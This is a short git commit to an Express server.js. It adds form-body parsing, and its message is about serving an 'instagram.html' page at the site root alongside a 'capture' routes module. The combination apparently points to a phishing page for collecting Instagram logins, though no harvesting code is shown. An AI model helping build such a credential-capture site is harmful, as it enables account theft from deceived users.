21b64f98f43bd44d2298ce49a01751f227919110
UTILISATEUR <utilisateur@sabjon.local>
2026-01-10 01:02:07 +0100

    Serve instagram.htmssssssssl on /

--- server.js
+++ server.js
@@ -4,6 +4,7 @@ const captureRoutes = require("./routes/capture");
 require("dotenv").config();
 
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 // rendre le dossier public accessible
 app.use(express.static("public"));
